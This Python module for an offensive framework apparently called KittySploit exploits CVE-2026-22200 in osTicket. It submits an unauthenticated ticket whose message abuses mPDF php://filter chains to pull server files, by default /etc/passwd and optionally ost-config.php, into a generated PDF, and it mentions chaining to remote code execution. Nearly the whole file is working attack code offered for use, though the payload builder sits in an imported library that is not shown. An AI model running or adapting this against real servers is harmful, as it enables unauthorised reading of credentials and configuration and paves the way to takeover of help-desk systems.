#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2026-22200 — osTicket anonymous ticket PDF file read (Horizon3).

Auxiliary: exfiltrates file content embedded in PDF via php://filter — no KittySploit session.
Chain CNEXT RCE separately once maps/libc are obtained from extracted BMPs.
"""

from __future__ import annotations

from kittysploit import *
from lib.protocols.http.osticket import Osticket


class Module(Auxiliary, Osticket):
    __info__ = {
        "name": "osTicket PDF PHP Filter File Read (CVE-2026-22200)",
        "description": (
            "Horizon3: submits an open.php ticket whose rich-text message abuses mPDF "
            "list-style-image php://filter chains. Retrieve bytes from the ticket PDF "
            "(extract BMP / use Horizon3 extract_pdf_images.py). No framework session."
        ),
        "author": ["Horizon3 Attack Team", "KittySploit Team"],
        "cve": ["CVE-2026-22200"],
        "platform": Platform.LINUX,
        "references": [
            "https://github.com/horizon3ai/CVE-2026-22200",
            "https://horizon3.ai/attack-research/attack-blogs/ticket-to-shell-exploiting-php-filters-and-cnext-in-osticket-cve-2026-22200/",
        ],
        "tags": ["osticket", "file-read", "php-filter", "unauth", "auxiliary"],
        "agent": {
            "risk": "critical",
            "effects": ["active_exploitation"],
            "expected_requests": 3,
            "reversible": False,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
            "requires": {"tech_hints_any": ["osticket"]},
            "chain": {
                "suggested_followups": [
                    "scanner/http/osticket_cve_2026_22200_detect",
                ],
            },
        },
    }

    remote_files = OptString(
        "/etc/passwd",
        "Comma-separated paths; suffix ,b64 or ,b64zlib per Horizon3 (e.g. include/ost-config.php,b64)",
        required=True,
    )
    submitter_name = OptString("KittySploit Probe", "Ticket submitter name", required=False)
    submitter_email = OptString(
        "probe@example.com",
        "Ticket email (needed to open ticket PDF later)",
        required=False,
    )
    ticket_subject = OptString(
        "Support request",
        "Ticket subject",
        required=False,
    )
    topic_id = OptInteger(0, "Help topic ID (0 = auto-select richtext topic)", required=False, advanced=True)
    cfg_salt = OptString(
        "",
        "Optional ost-config.php salt to auto-fetch view.php after submit",
        required=False,
        advanced=True,
    )
    ticket_user_id = OptString(
        "1",
        "User id for view.php hash when cfg_salt is set",
        required=False,
        advanced=True,
    )
    ticket_number = OptString(
        "",
        "Ticket number if known (else parsed from response)",
        required=False,
        advanced=True,
    )

    def run(self):
        paths = [p.strip() for p in str(self.remote_files or "").split(",") if p.strip()]
        if not paths:
            print_error("Set remote_files")
            return False

        print_status("CVE-2026-22200 — osTicket PDF file read (auxiliary)")
        message = self.build_file_read_message(paths, reply=False)
        email = str(self.submitter_email or "probe@example.com").strip()
        name = str(self.submitter_name or "KittySploit Probe").strip()
        subject = str(self.ticket_subject or "Support request").strip()
        tid = int(self.topic_id or 0) or None

        resp = self.submit_open_ticket(
            name=name,
            email=email,
            subject=subject,
            message_html=message,
            topic_id=tid,
        )
        if not resp:
            print_error("Failed to submit open.php ticket (topic/CSRF/open form?)")
            return False

        body = resp.text or ""
        ticket = str(self.ticket_number or "").strip() or self.parse_ticket_number(body) or ""
        print_success("Ticket submitted")
        if ticket:
            print_status(f"Ticket number: {ticket}")
        else:
            print_warning("Could not parse ticket number — check response manually")

        salt = str(self.cfg_salt or "").strip()
        if ticket and salt:
            view = self.fetch_ticket_view(
                ticket,
                email,
                str(self.ticket_user_id or "1"),
                salt,
            )
            if view and view.status_code == 200:
                print_status(f"view.php fetched ({len(view.text or '')} bytes) — download PDF attachment from UI")
            else:
                print_warning("view.php access failed — verify salt and user id")

        print_warning(
            "Extract file bytes from the ticket PDF (Horizon3 extract_pdf_images.py). "
            "CNEXT RCE requires maps + libc — not a session module."
        )
        return True
